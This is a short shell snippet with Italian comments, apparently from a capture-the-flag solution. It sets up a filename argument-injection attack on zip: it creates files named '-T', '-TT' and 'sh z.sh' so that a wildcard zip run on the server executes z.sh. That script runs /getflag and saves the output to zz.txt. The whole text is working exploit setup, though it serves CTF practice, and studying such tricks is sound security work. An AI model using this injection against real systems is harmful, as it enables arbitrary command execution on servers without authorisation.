    mkdir exploit && cd exploit

    touch -- -T
    touch -- -TT
    #-T dice a zip: "Testa l'archivio appena hai finito di crearlo".
    #-TT dice a zip: "Per testarlo, non usare il comando standard, ma usa il comando che ti scrivo subito dopo".

    #Crea un file vuoto che si chiama letteralmente sh z.sh
    touch "sh z.sh"

    #Crea un file chiamato z.sh (uno script bash) e ci scrive dentro il comando che vogliamo far eseguire al server.
    #Questo comando esegue /getflag e salva silenziosamente l'output nel file zz.txt.
    echo "/getflag > zz.txt" > z.sh
